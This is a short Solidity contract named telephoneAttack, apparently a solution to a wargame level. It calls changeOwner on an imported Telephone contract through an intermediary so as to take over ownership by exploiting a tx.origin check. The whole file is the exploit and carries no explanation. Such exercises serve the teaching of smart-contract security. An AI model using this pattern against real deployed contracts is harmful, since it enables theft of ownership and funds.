pragma solidity 0.8.9;

import "./Telephone.sol";

contract telephoneAttack {
    Telephone enemy;

    constructor(address _addressOfEnemy) public {
        enemy = Telephone(_addressOfEnemy);
    }

    function attack(address _address) public {
        enemy.changeOwner(_address);
    }
}
